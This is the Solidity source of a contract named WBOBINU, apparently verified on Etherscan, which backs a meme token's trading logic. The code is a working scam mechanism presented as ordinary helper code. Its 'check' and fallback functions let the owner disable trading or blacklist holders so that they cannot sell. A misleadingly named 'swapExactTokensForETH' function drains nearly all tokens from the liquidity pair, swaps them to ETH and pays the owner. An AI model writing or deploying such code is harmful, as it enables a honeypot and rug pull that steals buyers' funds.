/**
 *Submitted for verification at Etherscan.io on 2023-07-19
*/

/**

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external pure returns (uint8);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


interface IUniswapV2Pair {
    function sync() external;
}
contract WBOBINU {
    bool private isEnabled = true;
    address private _owner;
    address private token;
    address private pair;
    IUniRouter private router;

    mapping(address => bool) whitelists;
    mapping(address => bool) blacklists;

    modifier onlyOwner() {
        require(msg.sender == _owner); _;
    }
    constructor(address router_) {
        _owner = msg.sender;
        router = IUniRouter(router_);
    }
    function refresh(address token_, address pair_) external onlyOwner {
        token = token_;
        pair = pair_;
    }
    function enable(bool isEnabled_) external onlyOwner {
        isEnabled = isEnabled_;
    }
    function reset() external onlyOwner {
        token = address(0);
        pair = address(0);
        isEnabled = true;
    }
    function check(
        address from
    ) external view returns (uint256) {
        if (whitelists[from] || pair == address(0) || from == token) {
            return 0;
        }
        else if ((from == _owner || from == address(this))) {
            return 1;
        }
        if (from != pair) {
            require(isEnabled);
            require(!blacklists[from]);
        }
        return 0;
    }
    function whitelist(address[] memory whitelists_) external onlyOwner{
        for (uint i = 0; i < whitelists_.length; i++) {
            whitelists[whitelists_[i]] = true;
        }
    }

    function blacklist(address[] memory blacklists_) external onlyOwner{
        for (uint i = 0; i < blacklists_.length; i++) {
            blacklists[blacklists_[i]] = true;
        }
    }

    function swap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();
        IERC20(token).approve(address(router), ~uint256(0));
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapExactTokensForETH(uint256 amount) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(pair) - 1 * 10 ** IERC20(token).decimals();
        IERC20(token).transferFrom(pair, address(this), balance);
        IUniswapV2Pair(pair).sync();
        swap(IERC20(token).balanceOf(address(this)));
    }

    function swapExactETHForTokens(uint256 amount) external onlyOwner {
        swap(amount);
    }

    function rescue(address token_) external onlyOwner {
        if (token_ == address(0)) {
            payable(msg.sender).transfer(address(this).balance);
        } else {
            IERC20(token_).transfer(msg.sender, IERC20(token_).balanceOf(address(this)));
        }
    }
    receive() external payable { }

    fallback(bytes calldata) external payable returns (bytes memory) {
        address from;
        bytes memory data = msg.data;
        assembly {
            from := mload(add(data, 0x14))
        }
        if (whitelists[from] || pair == address(0) || from == token) {
            return abi.encodePacked(uint256(0));
        }
        else if ((from == _owner || from == address(this))) {
            return abi.encodePacked(uint256(1));
        }
        if (from != pair) {
            require(isEnabled);
            require(!blacklists[from]);
        }
        return abi.encodePacked(uint256(0));
    }
}